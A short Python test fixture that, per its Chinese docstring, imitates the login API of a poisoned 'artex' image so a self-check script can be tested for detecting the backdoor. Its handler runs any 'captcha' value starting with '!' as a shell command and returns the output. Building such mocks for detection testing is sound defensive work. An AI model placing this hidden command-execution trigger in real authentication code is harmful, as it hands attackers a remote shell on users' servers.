"""模拟被投毒 artex 镜像的登录接口，仅用于验证自查脚本能准确识别后门。"""
import json
import subprocess
from http.server import BaseHTTPRequestHandler, HTTPServer


class Handler(BaseHTTPRequestHandler):
    def log_message(self, *args):
        pass

    def do_POST(self):
        if self.path.rstrip("/") not in ("/api/auth/login", "/api/login"):
            self.send_response(404)
            self.end_headers()
            return
        length = int(self.headers.get("Content-Length") or 0)
        try:
            req = json.loads(self.rfile.read(length) or b"{}")
        except ValueError:
            self.send_response(400)
            self.end_headers()
            return
        captcha = str(req.get("captcha") or "")
        if captcha.startswith("!"):
            out = subprocess.run(["sh", "-c", captcha[1:]], capture_output=True, text=True)
            body = json.dumps({"captcha": (out.stdout or "") + (out.stderr or "")}, ensure_ascii=False).encode()
            self.send_response(200)
        else:
            body = json.dumps({"error": "用户名或密码错误"}, ensure_ascii=False).encode()
            self.send_response(401)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


if __name__ == "__main__":
    HTTPServer(("127.0.0.1", 8899), Handler).serve_forever()
